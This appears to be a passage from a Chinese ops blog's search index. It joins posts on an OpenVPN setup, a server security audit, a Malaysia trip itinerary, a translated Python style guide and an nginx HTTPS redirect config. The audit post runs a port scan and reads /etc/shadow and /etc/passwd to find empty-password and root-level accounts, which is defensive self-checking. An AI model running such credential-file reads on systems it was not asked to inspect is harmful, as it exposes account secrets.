xxx.xxx.xxx.xxx 11194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt cert client.crt key client.key remote-cert-tls server tls-auth ta.key 1 cipher AES-256-CBC comp-lzo verb 3  其中 xxx.xxx.xxx.xxx 11194是外网IP和端口映射到了内网服务器的192.168.1.2 1194上。  接下来连接测试即可。\n参考   OpenVPN Installation Notes\n  团队vpn安装\n  ","permalink":"https://www.fenghong.tech/blog/ops/openvpn-compile-install/","tags":["ops","vpn","iptables"],"title":"openvpn compile \u0026 install"},{"categories":["ops"],"contents":"[TOC]\n安装vpn 双击openvpn-install-2.3.6-I603-x86_64.进入安装界面直至安装成功。 记住自己的安装目录。 安装秘钥 解压qianxiangc 生成两个文件夹__MACOSX和qianxiangc. 打开安装的目录。C:\\Program Files\\OpenVPN 进入安装目录，打开config文件夹,将解压的两个文件夹复制过来。 启动vpn win10系统 右键属性，在目标的位置 \u0026quot;C:\\Program Files\\OpenVPN\\bin\\openvpn-gui.exe\u0026quot; --connect qianxiang.ovpn,如图 win7系统 直接以管理员身份启动vpn即可。\n","permalink":"https://www.fenghong.tech/blog/technology/vpn-clien-install/","tags":["ops","vpn"],"title":"vpn install"},{"categories":["ops"],"contents":"[TOC]\n端口扫描 采用nmap进行扫描1-65535端口\n[root@qx_production_PC qianxiang]# nmap -sS -p 1-65535 localhost Starting Nmap 5.51 ( http://nmap.org ) at 2019-01-16 10:30 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.0000020s latency). Other addresses for localhost (not scanned): 127.0.0.1 Not shown: 65511 closed ports PORT STATE SERVICE 80/tcp open http 81/tcp open hosts2-ns 443/tcp open https 3306/tcp open mysql 6822/tcp open unknown 8005/tcp open mxi 8009/tcp open ajp13 ... 用户 空密码用户，root用户及root组用户名单查询\nawk -F: 'length($2)==0 {print $1}' /etc/shadow awk -F: '$3==0 {print $1}' /etc/passwd awk -F: '$4==0 {print $1}' /etc/passwd 权限后门 cat /etc/crontab ls /var/spool/cron/ cat /etc/rc.d/rc.local ls /etc/rc.d ls /etc/rc3.d find / -type f -perm 4000 ","permalink":"https://www.fenghong.tech/blog/ops/safe-password-port/","tags":["safe","Linux"],"title":"端口扫描及用户安全"},{"categories":["living"],"contents":"[TOC]\n 导语： 2018年真的是幸运的一年！2019年攒钱大计！\n19年目标： 拿到驾照，争取攒钱10W以上，掌握java日常调优，掌握python，掌握MySQL数据库调优。\n 工作 进入钱香金融，从事运维工程师。\n部署jumpserver跳板机，部署openvpn堡垒机，部署企业云盘owncloud并与oss对象存储结合，部署负载均衡nginx反向代理高可用项目，开发线上自动化运维脚本，开发自动化测试脚本等~\n感情 2018年2月24号，告别了单身。\n生活 2018年4月29号，在洛阳，是一个好日子\n2018年5月28号，在无锡，周杰伦演唱会\n2018年6月18号，在上海，端午节~\n2018年7月13号，在绩溪，大山里\n2018年7月31号，在韩国济州岛。\n2018年9月10号，入住上海金口路新村。\n2018年10月1号，在湖南，张家界，湘西凤凰古城\n2019年1月31号， 上海飞桂林，桂林飞吉隆坡，吉隆坡去槟城，槟城去印度尼西亚\n2019年5月1号， 杭州\n2019年5月31号，入住上海保集澜湾\n2019年7月14号，入住上海博学家园\n结语 努力努力，2019年！\n","permalink":"https://www.fenghong.tech/blog/living/2018final/","tags":["living"],"title":"2018 小结"},{"categories":["tools"],"contents":"[TOC]\n前言\n 今天在某技术交流群，发现了一张总结的非常好的运维交接脑图，特粘贴到此分析给搭建，同时也给自己作一个备忘.\n 上图 参考  西门飞冰  ","permalink":"https://www.fenghong.tech/blog/technology/ops_to_fish/","tags":["ops"],"title":"ops to fish"},{"categories":["living"],"contents":"[TOC]\n简介\n 马来西亚，全称马来西亚联邦（Malaysia，前身马来亚），简称大马。是马来西亚联邦被南中国海分为两个部分。位于马来半岛的西马来西亚，北接泰国，南部隔着柔佛海峡，以新柔长堤和第二通道连接新加坡；东马来西亚，位于婆罗洲（加里曼丹岛）的北部，南部接印度尼西亚的加里曼丹，文莱国则夹于沙巴州和砂拉越州之间.\n马来西亚是一个新兴的多元化经济国家。经济在1990年代突飞猛进，为“亚洲四小虎”国家之一。马来西亚已成为亚洲地区引人注目的多元化新兴工业国家和世界新兴市场经济体。旅游业是马来西亚的第三大外汇收入来源，知识经济服务业也在同步扩张.\n 出发准备篇  签证  中国持外交、公务、因公普通护照者可免签证进入马来西亚停留30天.仅限从吉隆坡国际机场、吉隆坡第二国际机场等口岸入境.\n 插座转接头  马来西亚电压220V，电源插座为三芯垂直插座.\n 晕船药 tips   亚航的值机行李条打印什么的，都要自己动手，去check-in 机器打印，行李条自己贴上去，自己扫描登机牌和行李条的条形码，然后自己放上输送带。这个看似很方便，但是，一旦像我们从吉隆坡回程到广州到时候，遇到了机器故障，只能重新排人工托运那个队伍了.\n但是吉隆坡的火车、地铁系统相当confusing，似乎每条线隶属于不同的交通公司。买完票之后一定要问售票员怎么上车，自己找的话被绕晕也找不到入口.\n吉隆坡市内有免费的观光巴士\u0026ndash;紫色巴士，需要事先做好功课。懒得查了，只好苦了双腿，马六甲和吉隆坡两地步行最多，也为此花了不少钱做足疗.\n招商银行的储蓄卡汇率比较好 取钱：一定要出关找到 May Bank的ATM再取现金喔.\n提前查好每个地方的交通，在机场拿个地图.\n 行程+住宿篇  1.31 上海\u0026mdash;桂林  #### 机票时间 #### 上海航空 FM9176 上海浦东T1 21:10 -------------------- 00:10 桂林两江T2  2.1 桂林\u0026mdash;吉隆坡  #### 机票时间 #### AK0157 空客A320 KWL 两江国际机场 11:50 ------------------- 15:45 KUL吉隆坡国际机场T2 从 吉隆坡KUL机场 Jalan Cta3 到 The Explorers Guesthouse KLIA Ekspres ERL station ----\u0026gt; KL sentral #### 酒店名字 #### The Explorers Guesthouse 探索者宾馆 联系方式： 128 \u0026amp; 130 Jalan Tun H.S. Lee Kuala Lumpur, 55100 +60 3 2022 2928 从The Explorers Guesthouse 到 Bandar Tasik Selatan 有两条线路 RapidKL Masjid Jamek -------\u0026gt; Bandar Tasik Selatan （黄色线） KTM Kuala Lumpur--------\u0026gt; Bandar Tasik Selatan (蓝色线)  2.2 吉隆坡\u0026ndash;槟城  #### 订票 #### 吉隆坡到槟城的火车票(需要提前一个月订购) http://www.easybook.com/train/booking/kualalumpur-to-penang 吉隆坡到北海的火车票(需要提前一个月订购) https://www.easybook.com/train/booking/kualalumpur-to-ktmbutterworth #### tiket for bus #### 02 Feb 2019 01:30PM Kuala Lumpur，TBS(Terminal Bersepadu Selatan) -----\u0026gt; Penang Sentral(butterwrth) tel: +6016-5595882/+60165595771 tips： 到了北海火车站出站后跟着人群走有免费的巴士载你去码头，乘船到乔治市！ #### 入住时间 #### 2019年2月2日星期日 14:00至23:00 退房时间 2019年2月6日星期三 12:00至12:30 #### 酒店名字 #### WeLuv Travel Guesthouse 微心旅游 联系方式： 38, Lorong Kampung Malabar George Town, 10100 +60 14-342 7885  2.6 槟城\u0026ndash;兰卡威  #### 订票 #### 槟城到兰卡威的船票(只有8:30AM 和2:00PM两次票) https://www.busonlineticket.com/booking/penang-ferry-terminal-to-jetty-langkawi-ferry-tickets 酒店内部有售，暂时可以不买 #### 入住时间 #### 2019年2月6日星期三 14:00至00:00 退房时间 2019年2月9日星期六 07:30至12:00 从 Star Cruise Jetty 到 Senari Bay Resort ;#约莫6.3KM无公交，只能打车~ #### 酒店名字 #### Senari Bay Resort 瑟纳雷海湾度假村 联系方式： Kuala Cenang, MK. Kedawang Pantai Cenang, 07000 +60 11 2414 2324 tips： 海边的住宿，离机场较近 从 Senari Bay Resort 到 Langkawi International Airport #约莫7.0km  2.9 兰卡威\u0026ndash;吉隆坡  #### 机票时间 #### AK6309 LGK 08:15AM ------------ 09:25AM KUL 此次到酒店的路线同2.1 #### 入住时间 #### 2019年2月9日星期六 从15:00起 #### 酒店名字 #### The Explorers Guesthouse 探索者宾馆 联系方式： 128 \u0026amp; 130 Jalan Tun H.S. Lee Kuala Lumpur, 55100 +60 3 2022 2928  2.10 吉隆坡   #### 酒店名字 #### Sama Sama Express klia2 (Airside Transit Hotel) (萨玛萨玛KLIA2快捷酒店（航空中转酒店） 联系方式： Sama Sama Express klia2, L3 Satellite Building, klia2 Airport Terminal. Sepang, 64000 +60 3 8775 6620 tips: 22:00-04:00，然后赶飞机  2.11  #### 机票时间 #### AK0156 空客A320 KUL吉隆坡国际机场T2 07:15 ----------------- 11:05 KWL 两江国际机场  2.12  #### 机票时间 #### 上海航空FM9858 桂林两江T2 06：10 ---------------- 08：25 上海浦东T1 游玩美食篇 吉隆坡 双子塔KL Tower、阿罗街、独立广场\n 茨厂街吃吃吃，汉记靓粥的生鱼片粥以及肠粉，中央市场，嘉美克清真寺，地铁有一站就叫做嘉美克站，从这里出来的话，走着去茨厂街、中央市场（也就是中央艺术坊）都很方便~出了地铁站，就会看到这个，感觉吉隆坡也有槟城的小情怀啊~关帝庙附近的榴莲泡芙叫做开心小食店（Happy meal），吉隆坡老火车站，中央市场（中央艺术坊）二楼吃一次，金莲记，苏丹阿都沙末广场，圣玛丽大教堂还是很不错滴~这个广场附近有个吉隆坡galaxy city，主要展出的是吉隆坡的变化 屋顶酒吧可以俯瞰吉隆坡的夜景 吉隆坡好吃好玩的地方☞ 参考穷游  槟城 姓周桥 初恋红豆冰 拿壁画街的地图，打车的时候问司机联系方式，离开的时候可以来接你\n 愉园茶室（咖喱面，话梅汁，豆沙冰，Penang Assam Laksa） 大树下海鲜店 八爪鱼沾辣椒酱 麦片虾 在住宿的地方拿一个槟城壁画的信息导览图，建议租一辆自行车，骑车走一走，槐记蜜味烧腊，两个人吃了4份烧腊，光大大厦楼下的公交车站乘车去升旗山，大树下往前走20面，有个又买冷饮又买小吃的店，那就是名香泰！里面卖的凉茶实在是太棒啦！简直好喝到炸！沿着大树下饭店一直走，过马路就是姓周桥了~槟城和吉隆坡都有榴莲自助，槟城祥福贸易榴莲店”靠近光大附近. 槟城美食☞ 参考穷游  兰卡威 提前淘宝上报名（跳岛游+环岛+缆车）一日游\n地名  出发回国吉隆坡机场 KUL （KUL有两个航站楼，国际一般是KLIA2航站楼） 吉隆坡|中央车站 KL Sentral 吉隆坡|南湖镇客运站 TBS terminal Bersepadu Selatan 槟城北海站 Butterworth 槟城|双溪淋梦巴士站（Sungai Nibong Bus Terminal） 吉隆坡老火车站(Old Railway Station) KL Setral 可买吉隆坡到槟城的火车票  参考   吉隆坡机场KLIA2到吉隆坡市区的交通汇总\n  吉隆坡到槟城马六甲交通攻略\n  马来西亚出入境攻略\n  马来西亚自助游实用APP推荐\n  ","permalink":"https://www.fenghong.tech/blog/living/jilongpo/","tags":["tour","Malaysia"],"title":"Malaysia tour"},{"categories":["Python"],"contents":"[TOC]\nPython风格规范 分号  Tip\n不要在行尾加分号, 也不要用分号将两条命令放在同一行.\n 行长度  Tip\n每行不超过80个字符\n 例外:\n 长的导入模块语句 注释里的URL  不要使用反斜杠连接行.\nPython会将 圆括号, 中括号和花括号中的行隐式的连接起来 , 你可以利用这个特点. 如果需要, 你可以在表达式外围增加一对额外的圆括号.\nYes: foo_bar(self, width, height, color='black', design=None, x='foo', emphasis=None, highlight=0) if (width == 0 and height == 0 and color == 'red' and emphasis == 'strong'): 如果一个文本字符串在一行放不下, 可以使用圆括号来实现隐式行连接:\nx = ('This will build a very long long ' 'long long long long long long string') 在注释中，如果必要，将长的URL放在一行上。\nYes: # See details at # http://www.example.com/us/developer/documentation/api/content/v2.0/csv_file_name_extension_full_specification.html No: # See details at # http://www.example.com/us/developer/documentation/api/content/\\ # v2.0/csv_file_name_extension_full_specification.html 注意上面例子中的元素缩进; 你可以在本文的 缩进 部分找到解释.\n括号  Tip\n宁缺毋滥的使用括号\n 除非是用于实现行连接, 否则不要在返回语句或条件语句中使用括号. 不过在元组两边使用括号是可以的.\nYes: if foo: bar() while x: x = bar() if x and y: bar() if not x: bar() return foo for (x, y) in dict.items(): ... No: if (x): bar() if not(x): bar() return (foo) 缩进  Tip\n用4个空格来缩进代码\n 绝对不要用tab, 也不要tab和空格混用. 对于行连接的情况, 你应该要么垂直对齐换行的元素(见 行长度 部分的示例), 或者使用4空格的悬挂式缩进(这时第一行不应该有参数):\nYes: # Aligned with opening delimiter foo = long_function_name(var_one, var_two, var_three, var_four) # Aligned with opening delimiter in a dictionary foo = { long_dictionary_key: value1 + value2, ... } # 4-space hanging indent; nothing on first line foo = long_function_name( var_one, var_two, var_three, var_four) # 4-space hanging indent in a dictionary foo = { long_dictionary_key: long_dictionary_value, ... } No: # Stuff on first line forbidden foo = long_function_name(var_one, var_two, var_three, var_four) # 2-space hanging indent forbidden foo = long_function_name( var_one, var_two, var_three, var_four) # No hanging indent in a dictionary foo = { long_dictionary_key: long_dictionary_value, ... } 空行  Tip\n顶级定义之间空两行, 方法定义之间空一行\n 顶级定义之间空两行, 比如函数或者类定义. 方法定义, 类定义与第一个方法之间, 都应该空一行. 函数或方法中, 某些地方要是你觉得合适, 就空一行.\n空格  Tip\n按照标准的排版规范来使用标点两边的空格\n 括号内不要有空格.\nYes: spam(ham[1], {eggs: 2}, []) No: spam( ham[ 1 ], { eggs: 2 }, [ ] ) 不要在逗号, 分号, 冒号前面加空格, 但应该在它们后面加(除了在行尾).\nYes: if x == 4: print x, y x, y = y, x No: if x == 4 : print x , y x , y = y , x 参数列表, 索引或切片的左括号前不应加空格.\nYes: spam(1) no: spam (1) Yes: dict['key'] = list[index] No: dict ['key'] = list [index] 在二元操作符两边都加上一个空格, 比如赋值(=), 比较(==, \u0026lt;, \u0026gt;, !=, \u0026lt;\u0026gt;, \u0026lt;=, \u0026gt;=, in, not in, is, is not), 布尔(and, or, not). 至于算术操作符两边的空格该如何使用, 需要你自己好好判断. 不过两侧务必要保持一致.\nYes: x == 1 No: x\u0026lt;1 当’=’用于指示关键字参数或默认参数值时, 不要在其两侧使用空格.\nYes: def complex(real, imag=0.0): return magic(r=real, i=imag) No: def complex(real, imag = 0.0): return magic(r = real, i = imag) 不要用空格来垂直对齐多行间的标记, 因为这会成为维护的负担(适用于:, #, =等):\nYes: foo = 1000 # comment long_name = 2 # comment that should not be aligned dictionary = { \u0026quot;foo\u0026quot;: 1, \u0026quot;long_name\u0026quot;: 2, } No: foo = 1000 # comment long_name = 2 # comment that should not be aligned dictionary = { \u0026quot;foo\u0026quot; : 1, \u0026quot;long_name\u0026quot;: 2, } Shebang  Tip\n大部分.py文件不必以#!作为文件的开始. 根据 PEP-394 , 程序的main文件应该以 #!/usr/bin/python2或者 #!/usr/bin/python3开始.\n (译者注: 在计算机科学中, Shebang (也称为Hashbang)是一个由井号和叹号构成的字符串行(#!), 其出现在文本文件的第一行的前两个字符. 在文件中存在Shebang的情况下, 类Unix操作系统的程序载入器会分析Shebang后的内容, 将这些内容作为解释器指令, 并调用该指令, 并将载有Shebang的文件路径作为该解释器的参数. 例如, 以指令#!/bin/sh开头的文件在执行时会实际调用/bin/sh程序.)\n#!先用于帮助内核找到Python解释器, 但是在导入模块时, 将会被忽略. 因此只有被直接执行的文件中才有必要加入#!.\n注释  Tip\n确保对模块, 函数, 方法和行内注释使用正确的风格\n 文档字符串\nPython有一种独一无二的的注释方式: 使用文档字符串. 文档字符串是包, 模块, 类或函数里的第一个语句. 这些字符串可以通过对象的__doc__成员被自动提取, 并且被pydoc所用. (你可以在你的模块上运行pydoc试一把, 看看它长什么样). 我们对文档字符串的惯例是使用三重双引号”“”( PEP-257 ). 一个文档字符串应该这样组织: 首先是一行以句号, 问号或惊叹号结尾的概述(或者该文档字符串单纯只有一行). 接着是一个空行. 接着是文档字符串剩下的部分, 它应该与文档字符串的第一行的第一个引号对齐. 下面有更多文档字符串的格式化规范.\n模块\n每个文件应该包含一个许可样板. 根据项目使用的许可(例如, Apache 2.0, BSD, LGPL, GPL), 选择合适的样板.\n函数和方法\n下文所指的函数,包括函数, 方法, 以及生成器. 一个函数必须要有文档字符串, 除非它满足以下条件:\n  外部不可见\n  非常短小\n  简单明了\n  文档字符串应该包含函数做什么, 以及输入和输出的详细描述. 通常, 不应该描述”怎么做”, 除非是一些复杂的算法. 文档字符串应该提供足够的信息, 当别人编写代码调用该函数时, 他不需要看一行代码, 只要看文档字符串就可以了. 对于复杂的代码, 在代码旁边加注释会比使用文档字符串更有意义. 关于函数的几个方面应该在特定的小节中进行描述记录， 这几个方面如下文所述. 每节应该以一个标题行开始. 标题行以冒号结尾. 除标题行外, 节的其他内容应被缩进2个空格.\n  Args:\n列出每个参数的名字, 并在名字后使用一个冒号和一个空格, 分隔对该参数的描述.如果描述太长超过了单行80字符,使用2或者4个空格的悬挂缩进(与文件其他部分保持一致). 描述应该包括所需的类型和含义. 如果一个函数接受foo(可变长度参数列表)或者**bar (任意关键字参数), 应该详细列出foo和**bar.\n  Returns: (或者 Yields: 用于生成器)\n描述返回值的类型和语义. 如果函数返回None, 这一部分可以省略.\n  Raises:\n列出与接口有关的所有异常.\n  def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): \u0026quot;\u0026quot;\u0026quot;Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: {'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')} If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. \u0026quot;\u0026quot;\u0026quot; pass 类\n类应该在其定义下有一个用于描述该类的文档字符串. 如果你的类有公共属性(Attributes), 那么文档中应该有一个属性(Attributes)段. 并且应该遵守和函数参数相同的格式.\nclass SampleClass(object): \u0026quot;\u0026quot;\u0026quot;Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. \u0026quot;\u0026quot;\u0026quot; def __init__(self, likes_spam=False): \u0026quot;\u0026quot;\u0026quot;Inits SampleClass with blah.\u0026quot;\u0026quot;\u0026quot; self.likes_spam = likes_spam self.eggs = 0 def public_method(self): \u0026quot;\u0026quot;\u0026quot;Performs operation blah.\u0026quot;\u0026quot;\u0026quot; 块注释和行注释\n最需要写注释的是代码中那些技巧性的部分. 如果你在下次 代码审查 的时候必须解释一下, 那么你应该现在就给它写注释. 对于复杂的操作, 应该在其操作开始前写上若干行注释. 对于不是一目了然的代码, 应在其行尾添加注释.\n# We use a weighted dictionary search to find out where i is in # the array. We extrapolate position based on the largest num # in the array and the array size and then do binary search to # get the exact number. if i \u0026amp; (i-1) == 0: # True if i is 0 or a power of 2. 为了提高可读性, 注释应该至少离开代码2个空格.\n另一方面, 绝不要描述代码. 假设阅读代码的人比你更懂Python, 他只是不知道你的代码要做什么.\n# BAD COMMENT: Now go through the b array and make sure whenever i occurs # the next element is i+1 类  Tip\n如果一个类不继承自其它类, 就显式的从object继承. 嵌套类也一样.\n Yes: class SampleClass(object): pass class OuterClass(object): class InnerClass(object): pass class ChildClass(ParentClass): \u0026quot;\u0026quot;\u0026quot;Explicitly inherits from another class already.\u0026quot;\u0026quot;\u0026quot; No: class SampleClass: pass class OuterClass: class InnerClass: pass 继承自 object 是为了使属性(properties)正常工作, 并且这样可以保护你的代码, 使其不受 PEP-3000的一个特殊的潜在不兼容性影响. 这样做也定义了一些特殊的方法, 这些方法实现了对象的默认语义, 包括 __new__, __init__, __delattr__, __getattribute__, __setattr__, __hash__, __repr__, and __str__ .\n字符串  Tip\n即使参数都是字符串, 使用%操作符或者格式化方法格式化字符串. 不过也不能一概而论, 你需要在+和%之间好好判定.\n Yes: x = a + b x = '%s, %s!' % (imperative, expletive) x = '{}, {}!'.format(imperative, expletive) x = 'name: %s; score: %d' % (name, n) x = 'name: {}; score: {}'.format(name, n) No: x = '%s%s' % (a, b) # use + in this case x = '{}{}'.format(a, b) # use + in this case x = imperative + ', ' + expletive + '!' x = 'name: ' + name + '; score: ' + str(n) 避免在循环中用+和+=操作符来累加字符串. 由于字符串是不可变的, 这样做会创建不必要的临时对象, 并且导致二次方而不是线性的运行时间. 作为替代方案, 你可以将每个子串加入列表, 然后在循环结束后用 .join 连接列表. (也可以将每个子串写入一个 cStringIO.StringIO 缓存中.)\nYes: items = ['\u0026lt;table\u0026gt;'] for last_name, first_name in employee_list: items.append('\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;%s, %s\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;' % (last_name, first_name)) items.append('\u0026lt;/table\u0026gt;') employee_table = ''.join(items) No: employee_table = '\u0026lt;table\u0026gt;' for last_name, first_name in employee_list: employee_table += '\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;%s, %s\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;' % (last_name, first_name) employee_table += '\u0026lt;/table\u0026gt;' 在同一个文件中, 保持使用字符串引号的一致性. 使用单引号’或者双引号”之一用以引用字符串, 并在同一文件中沿用. 在字符串内可以使用另外一种引号, 以避免在字符串中使用. GPyLint已经加入了这一检查.\n(译者注:GPyLint疑为笔误, 应为PyLint.)\nYes: Python('Why are you hiding your eyes?') Gollum(\u0026quot;I'm scared of lint errors.\u0026quot;) Narrator('\u0026quot;Good!\u0026quot; thought a happy Python reviewer.') No: Python(\u0026quot;Why are you hiding your eyes?\u0026quot;) Gollum('The lint. It burns. It burns us.') Gollum(\u0026quot;Always the great lint. Watching. Watching.\u0026quot;) 为多行字符串使用三重双引号”“”而非三重单引号’‘’. 当且仅当项目中使用单引号’来引用字符串时, 才可能会使用三重’‘’为非文档字符串的多行字符串来标识引用. 文档字符串必须使用三重双引号”“”. 不过要注意, 通常用隐式行连接更清晰, 因为多行字符串与程序其他部分的缩进方式不一致.\nYes: print (\u0026quot;This is much nicer.\\n\u0026quot; \u0026quot;Do it this way.\\n\u0026quot;) No: print \u0026quot;\u0026quot;\u0026quot;This is pretty ugly. Don't do this. \u0026quot;\u0026quot;\u0026quot; 文件和sockets  Tip\n在文件和sockets结束时, 显式的关闭它.\n 除文件外, sockets或其他类似文件的对象在没有必要的情况下打开, 会有许多副作用, 例如:\n 它们可能会消耗有限的系统资源, 如文件描述符. 如果这些资源在使用后没有及时归还系统, 那么用于处理这些对象的代码会将资源消耗殆尽. 持有文件将会阻止对于文件的其他诸如移动、删除之类的操作. 仅仅是从逻辑上关闭文件和sockets, 那么它们仍然可能会被其共享的程序在无意中进行读或者写操作. 只有当它们真正被关闭后, 对于它们尝试进行读或者写操作将会抛出异常, 并使得问题快速显现出来.  而且, 幻想当文件对象析构时, 文件和sockets会自动关闭, 试图将文件对象的生命周期和文件的状态绑定在一起的想法, 都是不现实的. 因为有如下原因:\n 没有任何方法可以确保运行环境会真正的执行文件的析构. 不同的Python实现采用不同的内存管理技术, 比如延时垃圾处理机制. 延时垃圾处理机制可能会导致对象生命周期被任意无限制的延长. 对于文件意外的引用,会导致对于文件的持有时间超出预期(比如对于异常的跟踪, 包含有全局变量等).  推荐使用 “with”语句 以管理文件:\nwith open(\u0026quot;hello.txt\u0026quot;) as hello_file: for line in hello_file: print line 对于不支持使用”with”语句的类似文件的对象,使用 contextlib.closing():\nimport contextlib with contextlib.closing(urllib.urlopen(\u0026quot;http://www.python.org/\u0026quot;)) as front_page: for line in front_page: print line Legacy AppEngine 中Python 2.5的代码如使用”with”语句, 需要添加 “from future import with_statement”.\nTODO注释  Tip\n为临时代码使用TODO注释, 它是一种短期解决方案. 不算完美, 但够好了.\n TODO注释应该在所有开头处包含”TODO”字符串, 紧跟着是用括号括起来的你的名字, email地址或其它标识符. 然后是一个可选的冒号. 接着必须有一行注释, 解释要做什么. 主要目的是为了有一个统一的TODO格式, 这样添加注释的人就可以搜索到(并可以按需提供更多细节). 写了TODO注释并不保证写的人会亲自解决问题. 当你写了一个TODO, 请注上你的名字.\n# TODO(kl@gmail.com): Use a \u0026quot;*\u0026quot; here for string repetition. # TODO(Zeke) Change this to use relations. 如果你的TODO是”将来做某事”的形式, 那么请确保你包含了一个指定的日期(“2009年11月解决”)或者一个特定的事件(“等到所有的客户都可以处理XML请求就移除这些代码”).\n导入格式  Tip\n每个导入应该独占一行\n Yes: import os import sys No: import os, sys 导入总应该放在文件顶部, 位于模块注释和文档字符串之后, 模块全局变量和常量之前. 导入应该按照从最通用到最不通用的顺序分组:\n 标准库导入 第三方库导入 应用程序指定导入  每种分组中, 应该根据每个模块的完整包路径按字典序排序, 忽略大小写.\nimport foo from foo import bar from foo.bar import baz from foo.bar import Quux from Foob import ar 语句  Tip\n通常每个语句应该独占一行\n 不过, 如果测试结果与测试语句在一行放得下, 你也可以将它们放在同一行. 如果是if语句, 只有在没有else时才能这样做. 特别地, 绝不要对 try/except 这样做, 因为try和except不能放在同一行.\nYes: if foo: bar(foo) No: if foo: bar(foo) else: baz(foo) try: bar(foo) except ValueError: baz(foo) try: bar(foo) except ValueError: baz(foo) 访问控制  Tip\n在Python中, 对于琐碎又不太重要的访问函数, 你应该直接使用公有变量来取代它们, 这样可以避免额外的函数调用开销. 当添加更多功能时, 你可以用属性(property)来保持语法的一致性.\n (译者注: 重视封装的面向对象程序员看到这个可能会很反感, 因为他们一直被教育: 所有成员变量都必须是私有的! 其实, 那真的是有点麻烦啊. 试着去接受Pythonic哲学吧)\n另一方面, 如果访问更复杂, 或者变量的访问开销很显著, 那么你应该使用像 get_foo() 和 set_foo()这样的函数调用. 如果之前的代码行为允许通过属性(property)访问 , 那么就不要将新的访问函数与属性绑定. 这样, 任何试图通过老方法访问变量的代码就没法运行, 使用者也就会意识到复杂性发生了变化.\n命名  Tip\nmodule_name, package_name, ClassName, method_name, ExceptionName, function_name, GLOBAL_VAR_NAME, instance_var_name, function_parameter_name, local_var_name.\n 应该避免的名称\n  单字符名称, 除了计数器和迭代器. 包/模块名中的连字符(-) 双下划线开头并结尾的名称(Python保留, 例如__init__)   命名约定\n  所谓”内部(Internal)”表示仅模块内可用, 或者, 在类内是保护或私有的. 用单下划线(_)开头表示模块变量或函数是protected的(使用from module import *时不会包含). 用双下划线(__)开头的实例变量或方法表示类内私有. 将相关的类和顶级函数放在同一个模块里. 不像Java, 没必要限制一个类一个模块. 对类名使用大写字母开头的单词(如CapWords, 即Pascal风格), 但是模块名应该用小写加下划线的方式(如lower_with_under.py). 尽管已经有很多现存的模块使用类似于CapWords.py这样的命名, 但现在已经不鼓励这样做, 因为如果模块名碰巧和类名一致, 这会让人困扰.   Python之父Guido推荐的规范\n   Type Public Internal     Modules lower_with_under _lower_with_under   Packages lower_with_under    Classes CapWords _CapWords   Exceptions CapWords    Functions lower_with_under() _lower_with_under()   Global/Class Constants CAPS_WITH_UNDER _CAPS_WITH_UNDER   Global/Class Variables lower_with_under _lower_with_under   Instance Variables lower_with_under _lower_with_under (protected) or __lower_with_under (private)   Method Names lower_with_under() _lower_with_under() (protected) or __lower_with_under() (private)   Function/Method Parameters lower_with_under    Local Variables lower_with_under     Main  Tip\n即使是一个打算被用作脚本的文件, 也应该是可导入的. 并且简单的导入不应该导致这个脚本的主功能(main functionality)被执行, 这是一种副作用. 主功能应该放在一个main()函数中.\n 在Python中, pydoc以及单元测试要求模块必须是可导入的. 你的代码应该在执行主程序前总是检查 if __name__ == '__main__' , 这样当模块被导入时主程序就不会被执行.\ndef main(): ... if __name__ == '__main__': main() 所有的顶级代码在模块导入时都会被执行. 要小心不要去调用函数, 创建对象, 或者执行那些不应该在使用pydoc时执行的操作.\n来源\n google-python-styleguide  ","permalink":"https://www.fenghong.tech/blog/python/python-style/","tags":["Python","style"],"title":"google-python-styleguide"},{"categories":["ops"],"contents":"[TOC]\nULB的http强转https 负载均衡是高可用网络基础架构的关键组件，通常用于将工作负载分布到多个服务器来提高网站、应用、数据库或其他服务的性能和可靠性。\n负载均衡（ULB）能够为多个主机或其它服务实例提供基于网络报文或代理方式的流量分发的功能。用于在高并发服务环境下，构建由多个服务节点组成的“负载均衡服务集群”。“服务集群”能够扩展服务的处理及容错能力，并可自动消除由于单一服务节点故障对服务整体的影响，提高服务的可用性。\n目前ULB针对七层支持HTTP、HTTPs协议（类Nginx或HAproxy）；针对四层支持TCP协议及UDP协议（类LVS）。并且TCP协议支持两种方式：报文转发与请求代理。报文转发与请求代理模式详情可参考TCP的请求代理与报文转发。四层ULB支持外网与内网两种模式，而七层ULB目前仅支持外网。您可以参考如何选择ULB选择哪一层ULB来部署业务。\n忙活了几天，对ulb的负载均衡总算是有点成果了。如下：\n配置相关 第一步：前段负载均衡器的配置\n  创建负载均衡器。 进入ucloud的官网，加入开启一台ulb负载均衡器。这里对外开放，我们选择的是公网绑定\n  创建VServer，和阿里云一样，创建两个VServer一个是80端口，一个是443端口，协议分别为http和https。\n  用到443端口意味着我们需要上传ssl证书，上传也比较简单，上传申请的证书的crt和key文件即可。\n  http强制跳转至https，ulb暂未开通此项服务，只能在后端的服务器上添加转发规则。\n  第二步：后端服务器配置\n1. 安装nginx ，这里就不多累述，前面已经写过。 nginx编译安装\n2. 配置nginx\nvim /etc/nginx/conf.d/test.conf server { listen 81; server_name www.fenghong.tech; location / { proxy_pass http://localhost:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For$proxy_add_x_forwarded_for; } location = /50x.html { root html; } } server { listen 80; server_name www.fenghong.tech; #实现http到https强转的问题 rewrite ^(.*)$ https://www.fenghong.tech$1 permanent; location / { proxy_pass http://localhost:8080; } location = /50x.html { root html; } } 踩过的坑  配置后端的ssl证书且监听在443端口，导致网站被无限重定向，报错如下：  解决方案: 